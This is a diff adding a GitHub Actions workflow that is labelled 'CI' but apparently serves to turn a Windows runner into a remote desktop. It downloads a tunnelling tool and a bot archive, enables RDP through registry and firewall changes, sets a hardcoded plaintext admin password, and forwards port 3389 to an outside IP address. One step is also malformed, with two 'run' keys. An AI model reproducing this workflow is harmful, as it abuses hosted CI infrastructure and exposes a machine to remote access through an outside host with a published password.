@@ -1,0 +1,24 @@
+name: CI
+
+on: [push, workflow_dispatch]
+
+jobs:
+  build:
+
+    runs-on: windows-latest
+
+    steps:
+    - name: Download
+      run: Invoke-WebRequest https://github.com/ekzhang/bore/releases/download/v0.6.0/bore-v0.6.0-i686-pc-windows-msvc.zip -OutFile bore.zip
+      run: Invoke-WebRequest https://github.com/GMT2001-RTX/Dodo-Bot/archive/refs/heads/v3.zip -OutFile bot.zip
+    - name: Extract
+      run: Expand-Archive bore.zip
+    - run: Expand-Archive bot.zip
+    - run: move .\bot C:\Users\Public\Desktop\bot
+    - name: Enable TS
+      run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0
+    - run: Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+    - run: Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+    - run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
+    - name: Create Tunnel
+      run: .\bore\bore local 3389 --to 147.102.30.148 --port 9999
